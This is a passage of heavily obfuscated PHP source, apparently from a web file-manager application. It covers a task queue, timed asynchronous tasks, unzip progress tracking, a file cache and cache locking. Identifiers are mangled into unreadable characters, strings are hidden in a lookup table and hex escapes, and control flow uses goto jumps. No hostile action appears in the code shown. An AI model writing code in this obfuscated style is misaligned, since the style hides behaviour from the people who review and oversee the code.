USER_ID, $Û¢ïåâ[557] => 0, $Û¢ïåâ[496] => $àûêÁÍò, $Û¢ïåâ[495] => $ŞÈÊæºÎ); if ($this->where($Ÿİ£²¯ü)->find()) { return !1; } $Ÿİ£²¯ü = array($Û¢ïåâ[1773] => USER_ID, $Û¢ïåâ[557] => 0); $¬Ï¥¬…ê = $this->where($Ÿİ£²¯ü)->max($Û¢ïåâ[2004]); if (!$¬Ï¥¬…ê) { $¬Ï¥¬…ê = 0; } if (!$–»ÎÏß¼ && $àûêÁÍò == $Û¢ïåâ[490]) { $¦Å±º£¹ = Model($Û¢ïåâ[1428])->where(array($Û¢ïåâ[491] => $ŞÈÊæºÎ))->find(); if (!$¦Å±º£¹) { return !1; } $–»ÎÏß¼ = $¦Å±º£¹[$Û¢ïåâ[32]]; } $–»ÎÏß¼ = $this->getAutoName($–»ÎÏß¼); $ÑÃ¡¥Â‰ = array($Û¢ïåâ[1773] => USER_ID, $Û¢ïåâ[557] => 0, $Û¢ïåâ[494] => $–»ÎÏß¼, $Û¢ïåâ[495] => $ŞÈÊæºÎ, $Û¢ïåâ[496] => $àûêÁÍò, $Û¢ïåâ[1984] => $¬Ï¥¬…ê + 1); return $this->add($ÑÃ¡¥Â‰); } protected function remove($ñŒà²²î) { $¤çÌáÇ£ =& $_SERVER[íïàËŸë]; $áèÕÚõŞ = array($¤çÌáÇ£[1773] => USER_ID, $¤çÌáÇ£[493] => $ñŒà²²î); return $this->where($áèÕÚõŞ)->delete(); } protected function removeByName($¹¨ó÷ô) { $ãåÇéü =& $_SERVER[íïàËŸë]; $ÎÑöå‰¿ = array($ãåÇéü[1773] => USER_ID, $ãåÇéü[494] => $¹¨ó÷ô, $ãåÇéü[557] => 0); return $this->where($ÎÑöå‰¿)->delete(); } protected function rename($©ÊŒõÍ÷, $Å¾²œ¡) { $õÅ–ƒÂÅ =& $_SERVER[íïàËŸë]; if ($©ÊŒõÍ÷ == $Å¾²œ¡) { return !1; } $À¥îú‹ğ = $this->getAutoName($Å¾²œ¡); if ($Å¾²œ¡ != $À¥îú‹ğ) { return !1; } $°ıËäˆ« = array($õÅ–ƒÂÅ[1773] => USER_ID, $õÅ–ƒÂÅ[557] => 0, $õÅ–ƒÂÅ[32] => $©ÊŒõÍ÷); return $this->where($°ıËäˆ«)->save(array($õÅ–ƒÂÅ[32] => $Å¾²œ¡)); } protected function resetSort($‘ƒË¹ˆ) { $öÒÖ‰õ‹ =& $_SERVER[íïàËŸë]; $‘ƒË¹ˆ = is_array($‘ƒË¹ˆ) ? $‘ƒË¹ˆ : array(); $ü’¨€¿Š = array($öÒÖ‰õ‹[1773] => USER_ID); for ($äì²êµî = 0; $äì²êµî < count($‘ƒË¹ˆ); $äì²êµî++) { $ü’¨€¿Š[$öÒÖ‰õ‹[493]] = $‘ƒË¹ˆ[$äì²êµî]; $this->where($ü’¨€¿Š)->save(array($öÒÖ‰õ‹[1984] => $äì²êµî + 1)); } return !0; } protected function moveTop($Íªü÷•ú) { $‰õò×«¿ =& $_SERVER[íïàËŸë]; $Á•İïšÚ = array($‰õò×«¿[1773] => USER_ID, $‰õò×«¿[557] => 0); $¬±¶·½Ö = $this->where($Á•İïšÚ)->where(array($‰õò×«¿[32] => $Íªü÷•ú))->find(); if (!$¬±¶·½Ö) { return; } $†¬ß¤ÉÚ = $this->field($‰õò×«¿[475])->where($Á•İïšÚ)->order($‰õò×«¿[2458])->select(); $†¬ß¤ÉÚ = array_to_keyvalue($†¬ß¤ÉÚ, $‰õò×«¿[12], $‰õò×«¿[475]); $Ê‰Æé¬ï = $†¬ß¤ÉÚ; $†¬ß¤ÉÚ = array_remove_value($†¬ß¤ÉÚ, $¬±¶·½Ö[$‰õò×«¿[475]]); array_unshift($†¬ß¤ÉÚ, $¬±¶·½Ö[$‰õò×«¿[475]]); return $this->resetSort($†¬ß¤ÉÚ); } protected function moveBottom($æÃ²Œ·) { $šãïèà =& $_SERVER[íïàËŸë]; $¢ıˆòß = array($šãïèà[1773] => USER_ID, $šãïèà[557] => 0); $¤Ç°”Û = $this->where($¢ıˆòß)->max($šãïèà[2004]); $àÆøë¯Š = array($šãïèà[2004] => $¤Ç°”Û + 1); return $this->where($¢ıˆòß)->where(array($šãïèà[32] => $æÃ²Œ·))->save($àÆøë¯Š); } private function getAutoName($ÒÒîßëÙ) { $‰“ÚÁ±µ =& $_SERVER[íïàËŸë]; $äîé¥æ“ = array($‰“ÚÁ±µ[1773] => USER_ID, $‰“ÚÁ±µ[557] => 0); $Û™ƒˆ›  = $this->field($‰“ÚÁ±µ[32])->where($äîé¥æ“)->select(); $Û™ƒˆ›  = array_to_keyvalue($Û™ƒˆ› , $‰“ÚÁ±µ[12], $‰“ÚÁ±µ[32]); if (!$Û™ƒˆ›  || !in_array($ÒÒîßëÙ, $Û™ƒˆ› )) { return $ÒÒîßëÙ; } for ($àüÕåÉ¹ = 0; $àüÕåÉ¹ < count($Û™ƒˆ› ); $àüÕåÉ¹++) { if (!in_array($ÒÒîßëÙ . "\50{$àüÕåÉ¹}\51", $Û™ƒˆ› )) { return $ÒÒîßëÙ . "\50{$àüÕåÉ¹}\51"; } } return $ÒÒîßëÙ . "\x28{$àüÕåÉ¹}\51"; } } goto f¡é¼·†éì; DÌ©¨Šøê: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\x75\x65\x75\x65\x4c\x65\156\x67\x74\150"; const QUEUE_DATA = "\164\x61\163\153\x51\x75\145\x75\145\104\141\164\141"; const QUEUE_TIME = "\x74\141\x73\x6b\x51\x75\145\x75\145\x4c\x61\163\164\122\x75\156"; const QUEUE_THREAD = "\164\x61\163\153\121\x75\145\x75\x65\124\150\x72\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($„çôªğ, $¡ƒ›ÀÕ = array(), $¯Õ‹ ‚ı = '', $Ö€ÓÉ‚» = '') { $è»ğÜşœ =& $_SERVER[íïàËŸë]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ö€ÓÉ‚» && array_find_by_field(self::$listData, $è»ğÜşœ[97], $Ö€ÓÉ‚»)) { return !0; } if ($Ö€ÓÉ‚» && array_find_by_field(self::$listDataAdd, $è»ğÜşœ[97], $Ö€ÓÉ‚»)) { return !0; } self::$listDataAdd[] = array($è»ğÜşœ[341] => $„çôªğ, $è»ğÜşœ[1880] => $¡ƒ›ÀÕ, $è»ğÜşœ[526] => $¯Õ‹ ‚ı, $è»ğÜşœ[97] => $Ö€ÓÉ‚»); return !0; } public static function addSubmit() { $š›ëöİï =& $_SERVER[íïàËŸë]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($š›ëöİï[1881] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $š›ëöİï[12], $š›ëöİï[526])), $š›ëöİï[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($‰¯øùé», $Ù£Û·ü = array(), $€¶Êõ¿½ = '', $¨ÜåıÑ = '') { $¼‰Å´‹‹ =& $_SERVER[íïàËŸë]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ë†‚øËà = self::getAll(); if ($¨ÜåıÑ && array_find_by_field($ë†‚øËà, $¼‰Å´‹‹[97], $¨ÜåıÑ)) { return !0; } $ë†‚øËà[] = array($¼‰Å´‹‹[341] => $‰¯øùé», $¼‰Å´‹‹[1880] => $Ù£Û·ü, $¼‰Å´‹‹[526] => $€¶Êõ¿½, $¼‰Å´‹‹[97] => $¨ÜåıÑ); self::setAll($ë†‚øËà); write_log($¼‰Å´‹‹[1881] . $€¶Êõ¿½, $¼‰Å´‹‹[197]); return !0; } public static function run() { $Ó½šó‹§ =& $_SERVER[íïàËŸë]; $Ö³¯Ó– = self::getAll(); $Æ‹à÷åí = array_shift($Ö³¯Ó–); if (!$Æ‹à÷åí) { return !1; } self::setAll($Ö³¯Ó–); $’ĞêÈªÛ = timeFloat(); $¶úƒ…Ú× = $Ó½šó‹§[12]; try { $¶úƒ…Ú× = Hook::apply($Æ‹à÷åí[$Ó½šó‹§[341]], $Æ‹à÷åí[$Ó½šó‹§[1880]]); } catch (Exception $ËÙ£ éü) { write_log($ËÙ£ éü, $Ó½šó‹§[1275]); } $ÔÑ„– Ñ = number_format(timeFloat() - $’ĞêÈªÛ, 3) . $Ó½šó‹§[1798]; if ($¶úƒ…Ú× && is_string($¶úƒ…Ú×)) { $ÔÑ„– Ñ = $ÔÑ„– Ñ . $Ó½šó‹§[1882] . $¶úƒ…Ú×; } write_log($Ó½šó‹§[1883] . $Æ‹à÷åí[$Ó½šó‹§[526]] . $Ó½šó‹§[1884] . $ÔÑ„– Ñ, $Ó½šó‹§[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ÙæôÌŞÜ =& $_SERVER[íïàËŸë]; $óŞ°”€ = self::threadCount() + 1; if ($óŞ°”€ > 3 || !self::count()) { return; } write_log($ÙæôÌŞÜ[1885] . $óŞ°”€, $ÙæôÌŞÜ[197]); Cache::set(self::QUEUE_THREAD, $óŞ°”€, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ÙæôÌŞÜ[1886], $ÙæôÌŞÜ[197]); } public static function getKey($×³¬‡ºê, $ç»ğè•œ = "\151\x6e\x74") { $­îŸúË =& $_SERVER[íïàËŸë]; Cache::removeMemory($×³¬‡ºê); $Ï‚ğŸ‰Ç = Cache::get($×³¬‡ºê); if ($ç»ğè•œ == $­îŸúË[364]) { return $Ï‚ğŸ‰Ç ? intval($Ï‚ğŸ‰Ç) : 0; } if ($ç»ğè•œ == $­îŸúË[1887]) { return is_array($Ï‚ğŸ‰Ç) ? $Ï‚ğŸ‰Ç : array(); } return $Ï‚ğŸ‰Ç; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[íïàËŸë][1887]); } public static function setAll($³Ï‹÷”) { $¼›‡æ–é = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($³Ï‹÷”), $¼›‡æ–é); Cache::set(self::QUEUE_DATA, $³Ï‹÷”, $¼›‡æ–é); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Á¦„ğã, $¼‡­•• = 5.0) { if (!$Á¦„ğã) { return; } $«ñšœóô = Cache::get($Á¦„ğã); if (!$«ñšœóô || timeFloat() - floatVal($«ñšœóô) >= $¼‡­••) { Cache::set($Á¦„ğã, timeFloat(), $¼‡­•• * 10); return !0; } return !1; } public static function timeLimitCall($™İ„ü”ú, $ûäÚ‹§ö, $õÏ˜¨Á¶, $º‰ÖŠŒò = 5.0) { $¹ØœÕÖ =& $_SERVER[íïàËŸë]; if (!$™İ„ü”ú || !$ûäÚ‹§ö) { return; } self::$asyncAdd = !0; $Ç„Ãõ¯ = $¹ØœÕÖ[1888]; $úÕ¾Ö”Ã = Cache::get($Ç„Ãõ¯, !0); $—“îŠîõ = array($¹ØœÕÖ[1889] => timeFloat(), $¹ØœÕÖ[1890] => timeFloat(), $¹ØœÕÖ[341] => $ûäÚ‹§ö, $¹ØœÕÖ[1880] => $õÏ˜¨Á¶, $¹ØœÕÖ[206] => $º‰ÖŠŒò); if (is_array($úÕ¾Ö”Ã[$™İ„ü”ú])) { $—“îŠîõ[$¹ØœÕÖ[1890]] = $úÕ¾Ö”Ã[$™İ„ü”ú][$¹ØœÕÖ[1890]]; } if (is_array($úÕ¾Ö”Ã[$™İ„ü”ú])) { if (timeFloat() - $úÕ¾Ö”Ã[$™İ„ü”ú][$¹ØœÕÖ[1889]] < $—“îŠîõ[$¹ØœÕÖ[206]] * 0.3) { return; } $—“îŠîõ[$¹ØœÕÖ[1890]] = $úÕ¾Ö”Ã[$™İ„ü”ú][$¹ØœÕÖ[1890]]; } $úÕ¾Ö”Ã[$™İ„ü”ú] = $—“îŠîõ; Cache::set($Ç„Ãõ¯, $úÕ¾Ö”Ã, 60); Cache::removeMemory($Ç„Ãõ¯); write_log($¹ØœÕÖ[1891] . $™İ„ü”ú . $¹ØœÕÖ[74] . $ûäÚ‹§ö, $¹ØœÕÖ[197]); } public static function timeLimitCallLoop() { $æÇ“»‰ =& $_SERVER[íïàËŸë]; $‹æ´£¢ = array($æÇ“»‰[1892]); $ï…ïâÒ€ = in_array(strtolower(ACTION), $‹æ´£¢); if (!$ï…ïâÒ€ && !self::$asyncAdd) { return; } $ÙÌæõ¾ = $æÇ“»‰[1888]; $¢¶¯¥È = Cache::get($ÙÌæõ¾, !0); if (!$¢¶¯¥È || count($¢¶¯¥È) <= 0) { return; } $Ó¶’›Àæ = !1; $Šßµ“”• = timeFloat(); $›ŸÚõÉ« = array(); foreach ($¢¶¯¥È as $ÔÀ§Æƒ‘ => $ııï˜§“) { if ($Šßµ“”• - $ııï˜§“[$æÇ“»‰[1890]] > $ııï˜§“[$æÇ“»‰[206]]) { $Ó¶’›Àæ = !0; try { Hook::apply($ııï˜§“[$æÇ“»‰[341]], $ııï˜§“[$æÇ“»‰[1880]]); write_log($æÇ“»‰[1893] . $ÔÀ§Æƒ‘ . $æÇ“»‰[74] . $ııï˜§“[$æÇ“»‰[341]] . $æÇ“»‰[1894] . ACTION, $æÇ“»‰[197]); } catch (Exception $ÂœîÁ˜¢) { } continue; } $›ŸÚõÉ«[$ÔÀ§Æƒ‘] = $ııï˜§“; } if (!$Ó¶’›Àæ) { return; } if (!$›ŸÚõÉ«) { return Cache::remove($ÙÌæõ¾); } Cache::set($ÙÌæõ¾, $›ŸÚõÉ«, 60); Cache::removeMemory($ÙÌæõ¾); } public static function finished($ÚÜ‰¥«, $ÜÁÏ¤÷) { $şûÙëºß =& $_SERVER[íïàËŸë]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($şûÙëºß[341] => $ÚÜ‰¥«, $şûÙëºß[1880] => $ÜÁÏ¤÷); } private static function finishedRun() { $æà«Ğ =& $_SERVER[íïàËŸë]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ĞÄÚôº) { try { Hook::apply($ĞÄÚôº[$æà«Ğ[341]], $ĞÄÚôº[$æà«Ğ[1880]]); } catch (Exception $ÄÚ¹–’¼) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $´ä›Èô¶ =& $_SERVER[íïàËŸë]; parent::startAfter(); Hook::bind($´ä›Èô¶[1895], array($this, $´ä›Èô¶[1896])); Hook::bind($´ä›Èô¶[1289], array($this, $´ä›Èô¶[1897])); Hook::bind($´ä›Èô¶[1898], array($this, $´ä›Èô¶[1899])); $­Éç£ğ =& $this->task; $­Éç£ğ[$´ä›Èô¶[1900]] = $´ä›Èô¶[1290]; if (!$­Éç£ğ[$´ä›Èô¶[1671]]) { $­Éç£ğ[$´ä›Èô¶[1671]] = LNG($´ä›Èô¶[1901]); } } protected function endAfter() { $ÖĞŞ½¨˜ =& $_SERVER[íïàËŸë]; parent::endAfter(); Hook::unbind($ÖĞŞ½¨˜[1895], array($this, $ÖĞŞ½¨˜[1896])); Hook::unbind($ÖĞŞ½¨˜[1289], array($this, $ÖĞŞ½¨˜[1897])); Hook::unbind($ÖĞŞ½¨˜[1898], array($this, $ÖĞŞ½¨˜[1899])); } public function updateAfter() { $Ë¡ ‚ë˜ =& $_SERVER[íïàËŸë]; $ÏâµÎ¿ =& $this->task; if (!$ÏâµÎ¿[$Ë¡ ‚ë˜[1152]] || !$ÏâµÎ¿[$Ë¡ ‚ë˜[846]]) { if ($ÏâµÎ¿[$Ë¡ ‚ë˜[1900]] != $Ë¡ ‚ë˜[389]) { return; } } if ($ÏâµÎ¿[$Ë¡ ‚ë˜[1900]] == $Ë¡ ‚ë˜[1290]) { $ï›•ÇÉ£ = 0; if ($ÏâµÎ¿[$Ë¡ ‚ë˜[1835]]) { $ï›•ÇÉ£ = $ÏâµÎ¿[$Ë¡ ‚ë˜[1836]] / $ÏâµÎ¿[$Ë¡ ‚ë˜[1835]]; } $ÏâµÎ¿[$Ë¡ ‚ë˜[1784]] = $ï›•ÇÉ£ * 0.3; } else { if ($ÏâµÎ¿[$Ë¡ ‚ë˜[1900]] == $Ë¡ ‚ë˜[389]) { $ï›•ÇÉ£ = $ÏâµÎ¿[$Ë¡ ‚ë˜[1783]] / $ÏâµÎ¿[$Ë¡ ‚ë˜[1152]]; $ÏâµÎ¿[$Ë¡ ‚ë˜[1784]] = 0.3 + $ï›•ÇÉ£ * 0.4; } else { if ($ÏâµÎ¿[$Ë¡ ‚ë˜[1900]] == $Ë¡ ‚ë˜[110]) { $×¶™†Äº = 0; if ($ÏâµÎ¿[$Ë¡ ‚ë˜[1837]] == $Ë¡ ‚ë˜[110]) { $×¶™†Äº = $ÏâµÎ¿[$Ë¡ ‚ë˜[1836]]; } $ï›•ÇÉ£ = ($ÏâµÎ¿[$Ë¡ ‚ë˜[1840]] + $×¶™†Äº) / $ÏâµÎ¿[$Ë¡ ‚ë˜[846]]; $ÏâµÎ¿[$Ë¡ ‚ë˜[1784]] = 0.3 + 0.4 + $ï›•ÇÉ£ * 0.3; } } } if ($ÏâµÎ¿[$Ë¡ ‚ë˜[1784]] > 0) { $ã‚ƒ¤µÍ = timeFloat() - $ÏâµÎ¿[$Ë¡ ‚ë˜[1786]] - $ÏâµÎ¿[$Ë¡ ‚ë˜[1789]]; $ÏâµÎ¿[$Ë¡ ‚ë˜[1790]] = $ã‚ƒ¤µÍ * (1 - $ÏâµÎ¿[$Ë¡ ‚ë˜[1784]]) / $ÏâµÎ¿[$Ë¡ ‚ë˜[1784]]; } } public function addFile($ãí„™‡Á) { $ô´ã÷ŒÁ =& $_SERVER[íïàËŸë]; $›öÜ×Óë =& $this->task; $Ê—ğßö‰ = IO::info($ãí„™‡Á); $›öÜ×Óë[$ô´ã÷ŒÁ[1833]] = $Ê—ğßö‰[$ô´ã÷ŒÁ[32]]; $›öÜ×Óë[$ô´ã÷ŒÁ[1835]] = $Ê—ğßö‰[$ô´ã÷ŒÁ[79]]; $›öÜ×Óë[$ô´ã÷ŒÁ[1836]] = 0; $›öÜ×Óë[$ô´ã÷ŒÁ[1154]] = $ô´ã÷ŒÁ[1856]; $›öÜ×Óë[$ô´ã÷ŒÁ[1837]] = $ô´ã÷ŒÁ[1290]; $›öÜ×Óë[$ô´ã÷ŒÁ[846]] = $Ê—ğßö‰[$ô´ã÷ŒÁ[79]]; $›öÜ×Óë[$ô´ã÷ŒÁ[1152]] = 1; $šõ¼§ÒÒ = 0; $›öÜ×Óë[$ô´ã÷ŒÁ[1844]] = array($ô´ã÷ŒÁ[1845] => $šõ¼§ÒÒ + 1, $ô´ã÷ŒÁ[494] => $Ê—ğßö‰[$ô´ã÷ŒÁ[32]], $ô´ã÷ŒÁ[87] => $Ê—ğßö‰[$ô´ã÷ŒÁ[87]], $ô´ã÷ŒÁ[582] => $Ê—ğßö‰[$ô´ã÷ŒÁ[582]] ? $Ê—ğßö‰[$ô´ã÷ŒÁ[582]] : $Ê—ğßö‰[$ô´ã÷ŒÁ[87]]); $this->update(); } public function zipEvent($İ™¬Ê˜Ü, $êÔÊ­’©, $öÌœùèÜ, $åÌÁàå) { $ÛÉ =& $_SERVER[íïàËŸë]; $ş®³³İ =& $this->task; $ş®³³İ[$ÛÉ[1833]] = get_path_this($êÔÊ­’©); $ş®³³İ[$ÛÉ[1835]] = $åÌÁàå; $ş®³³İ[$ÛÉ[1836]] = $öÌœùèÜ; $ş®³³İ[$ÛÉ[1154]] = $İ™¬Ê˜Ü == $ÛÉ[1902] ? $ÛÉ[1903] : $ÛÉ[1904]; $ş®³³İ[$ÛÉ[1837]] = $ÛÉ[12]; $ş®³³İ[$ÛÉ[846]] = $åÌÁàå; $ş®³³İ[$ÛÉ[1900]] = $ÛÉ[389]; $this->update(); } public function unzipAfter($€¥ïÆúÖ) { $–şªÉ±š =& $_SERVER[íïàËŸë]; $ıÇùÅ«± =& $this->task; $ıÇùÅ«±[$–şªÉ±š[1900]] = $–şªÉ±š[110]; $Á«ÍÌ© = IO::infoWithChildren($€¥ïÆúÖ); $¥ã…å¿• = 0; $ıÇùÅ«±[$–şªÉ±š[1844]] = array($–şªÉ±š[1845] => $¥ã…å¿• + 1, $–şªÉ±š[494] => $Á«ÍÌ©[$–şªÉ±š[32]], $–şªÉ±š[87] => $Á«ÍÌ©[$–şªÉ±š[87]], $–şªÉ±š[582] => $Á«ÍÌ©[$–şªÉ±š[582]] ? $Á«ÍÌ©[$–şªÉ±š[582]] : $Á«ÍÌ©[$–şªÉ±š[87]]); if ($Á«ÍÌ©[$–şªÉ±š[33]] == $–şªÉ±š[230]) { $ıÇùÅ«±[$–şªÉ±š[1152]] = 1; } else { $ıÇùÅ«±[$–şªÉ±š[1152]] = $Á«ÍÌ©[$–şªÉ±š[82]][$–şªÉ±š[80]]; } $ıÇùÅ«±[$–şªÉ±š[1154]] = $–şªÉ±š[12]; $ıÇùÅ«±[$–şªÉ±š[1837]] = 0; $ıÇùÅ«±[$–şªÉ±š[1783]] = 0; $ıÇùÅ«±[$–şªÉ±š[1835]] = 0; $ıÇùÅ«±[$–şªÉ±š[1836]] = 0; $ıÇùÅ«±[$–şªÉ±š[1833]] = $–şªÉ±š[12]; $ıÇùÅ«±[$–şªÉ±š[1840]] = 0; $ıÇùÅ«±[$–şªÉ±š[846]] = $Á«ÍÌ©[$–şªÉ±š[79]]; $this->update(); self::log($–şªÉ±š[1905] . json_encode(array($ıÇùÅ«±, $Á«ÍÌ©))); } public function nameParse($ùë‰ú‡³) { $ªáª¢±Ø =& $_SERVER[íïàËŸë]; $£ÛúóÅµ =& $this->task; if ($£ÛúóÅµ[$ªáª¢±Ø[1900]] == $ªáª¢±Ø[1290]) { $£ÛúóÅµ[$ªáª¢±Ø[1900]] = $ªáª¢±Ø[389]; $£ÛúóÅµ[$ªáª¢±Ø[1840]] = 0; $£ÛúóÅµ[$ªáª¢±Ø[846]] = 0; } $¾ş« ËÔ = get_path_this($ùë‰ú‡³); if (strstr($¾ş« ËÔ, $ªáª¢±Ø[10])) { $£ÛúóÅµ[$ªáª¢±Ø[1783]] += 1; $£ÛúóÅµ[$ªáª¢±Ø[1152]] += 1; } $£ÛúóÅµ[$ªáª¢±Ø[1833]] = $ùë‰ú‡³; $this->update(); } } goto d÷ÀÉ…ÊÍ; a‘«¯Äº¥: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($®Ç¿ï‹, $ü¥Ğ«ñ) { $Š¢«Éûµ =& $_SERVER[íïàËŸë]; $this->cachePath = $®Ç¿ï‹[$Š¢«Éûµ[87]]; $this->prefix = $Š¢«Éûµ[924]; $this->cacheTime = $ü¥Ğ«ñ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¡ÜöÇ‚ø) { $ù´Ùê¬İ =& $_SERVER[íïàËŸë]; $¡ÜöÇ‚ø = str_replace(array($ù´Ùê¬İ[925], $ù´Ùê¬İ[100], $ù´Ùê¬İ[76]), $ù´Ùê¬İ[926], $¡ÜöÇ‚ø); return $this->cachePath . $ù´Ùê¬İ[927] . $¡ÜöÇ‚ø . $ù´Ùê¬İ[928]; } public function set($şøæˆÕ™, $–è²‰, $¯˜±äô£ = false) { $¯˜±äô£ = $¯˜±äô£ ? $¯˜±äô£ : $this->cacheTime; $èóÎ’şˆ = $this->getFile($şøæˆÕ™); if (file_put_contents($èóÎ’şˆ, $this->prefix . $–è²‰, LOCK_EX)) { @touch($èóÎ’şˆ, intval(time() + $¯˜±äô£)); clearstatcache(); return !0; } @unlink($èóÎ’şˆ); return !1; } public function get($äıá¦ùº) { $Ã§¿Òø = $this->getFile($äıá¦ùº); if (file_exists($Ã§¿Òø) && filemtime($Ã§¿Òø) < time()) { @unlink($Ã§¿Òø); return !1; } $Ü•âÅ = @file_get_contents($Ã§¿Òø); return substr($Ü•âÅ, strlen($this->prefix)); } public function remove($ËÊ¿Å•») { $óæ“³• = $this->getFile($ËÊ¿Å•»); return @unlink($óæ“³•); } public function deleteAll() { $¢ÌÃ€áë =& $_SERVER[íïàËŸë]; $é€íâÕƒ = scandir($this->cachePath); foreach ($é€íâÕƒ as $‹Ô§ëÃñ) { $ÁòÒÊ = $this->cachePath . $‹Ô§ëÃñ; if (strpos($ÁòÒÊ, $¢ÌÃ€áë[928]) && strpos($ÁòÒÊ, $¢ÌÃ€áë[929])) { @unlink($ÁòÒÊ); } } } public function clearTimeout() { $²×™åÕí =& $_SERVER[íïàËŸë]; $ãæ²Ñ¨Ô = scandir($this->cachePath); foreach ($ãæ²Ñ¨Ô as $ü³“É‡±) { $ÚÓõœ× = $this->cachePath . $ü³“É‡±; if (strpos($ÚÓõœ×, $²×™åÕí[928]) && strpos($ÚÓõœ×, $²×™åÕí[929]) && filemtime($ÚÓõœ×) < time()) { @unlink($ÚÓõœ×); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¾¢ÊŠ®Ä =& $_SERVER[íïàËŸë]; if (self::$handle) { return self::$handle; } $šàÆ©Ì = $GLOBALS[$¾¢ÊŠ®Ä[6]][$¾¢ÊŠ®Ä[425]]; self::$timeout = $šàÆ©Ì[$¾¢ÊŠ®Ä[930]] ? $šàÆ©Ì[$¾¢ÊŠ®Ä[930]] : 10; $ŒúÅ´ã = _get($GLOBALS[$¾¢ÊŠ®Ä[6]], $¾¢ÊŠ®Ä[931]); $¿äÊç‹” = $šàÆ©Ì[$¾¢ÊŠ®Ä[916]] ? $šàÆ©Ì[$¾¢ÊŠ®Ä[916]] : $¾¢ÊŠ®Ä[230]; if ($¿äÊç‹” == $¾¢ÊŠ®Ä[21] && $ŒúÅ´ã == $¾¢ÊŠ®Ä[13]) { $¿äÊç‹” = $¾¢ÊŠ®Ä[230]; } switch ($¿äÊç‹”) { case $¾¢ÊŠ®Ä[919]: self::$handle = new CacheLockRedis(); break; case $¾¢ÊŠ®Ä[920]: self::$handle = new CacheLockMemcached(); break; case $¾¢ÊŠ®Ä[21]: self::$handle = new CacheLockDatabase(); break; case $¾¢ÊŠ®Ä[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¾¢ÊŠ®Ä[932], $¾¢ÊŠ®Ä[933]); } return self::$handle; } private static function key($œ±–‡÷ñ) { return $_SERVER[íïàËŸë][934] . Cache::key($œ±–‡÷ñ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($€¤¡óŠº = '') { self::$errorMsg = $€¤¡óŠº; } public static function lockGlobal($ãé¾•ª¥, $¶Ì®ßõ) { return self::lock($ãé¾•ª¥, $¶Ì®ßõ, !0); } public static function lock($ïöì¾Ÿí, $§îÚúñ€ = false, $ÖİÍ»Å = false) { $ñÊ®ããª =& $_SERVER[íïàËŸë]; $‹£¼»¼ü = self::init(); $×Œ×§€ = self::key($ïöì¾Ÿí); $§îÚúñ€ = $§îÚúñ€ ? $§îÚúñ€ : self::$timeout; $îÄ•¥Ì = timeFloat(); $•’Îû = $‹£¼»¼ü->lock($×Œ×§€, $§îÚúñ€); $™Çñß÷™ = timeFloat(); if (!$•’Îû) { $Ÿİâ‰¥¡ = "\x6c\x6f\143\153\40\x65\162\162\157\x72\73\x6b\x65\171\75{$ïöì¾Ÿí}\73\164\x69\x6d\145\x3d{$§îÚúñ€}\73" . self::$errorMsg . $ñÊ®ããª[74] . get_caller_msg(); $ë€”¤¨° = LNG($ñÊ®ããª[935]) . "\50{$§îÚúñ€}\x73\x29\x2e" . LNG($ñÊ®ããª[936]); $ë€”¤¨° .= $ñÊ®ããª[937]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ë€”¤¨° = $ë€”¤¨° . $ñÊ®ããª[938] . self::$errorMsg; } write_log($ñÊ®ããª[939] . sprintf($ñÊ®ããª[940], timeFloat() - $îÄ•¥Ì) . $ñÊ®ããª[941] . $Ÿİâ‰¥¡ . $ñÊ®ããª[942] . error_get_last(), $ñÊ®ããª[933]); show_json($ë€”¤¨°, !1); } if (!$ÖİÍ»Å) { self::$lockItem[$×Œ×§€] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ûó×’óĞ = number_format(timeFloat() - $™Çñß÷™, 3); write_log($ñÊ®ããª[943] . $ïöì¾Ÿí . $ñÊ®ããª[944] . $ûó×’óĞ, $ñÊ®ããª[933]); } return $•’Îû; } public static function lockGet($â¡õçÆ) { $»ñåÕß = self::key($â¡õçÆ); if (self::$lockItem[$»ñåÕß]) { return self::$lockItem[$»ñåÕß]; } return self::init()->lockGet($»ñåÕß); } public static function unlock($ö§¯—àè) { $ïşËš =& $_SERVER[íïàËŸë]; $ŒŠØÙõ = self::key($ö§¯—àè); self::$lockItem[$ŒŠØÙõ] = null; self::init()->unlock($ŒŠØÙõ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ïşËš[945] . $ö§¯—àè, $ïşËš[933]); } return; } public static function unlockRuntime() { $ßŒáÚÅ =& $_SERVER[íïàËŸë]; $“ñ ‘±æ = self::init(); $ºŠÔ®‡Á = !1; foreach 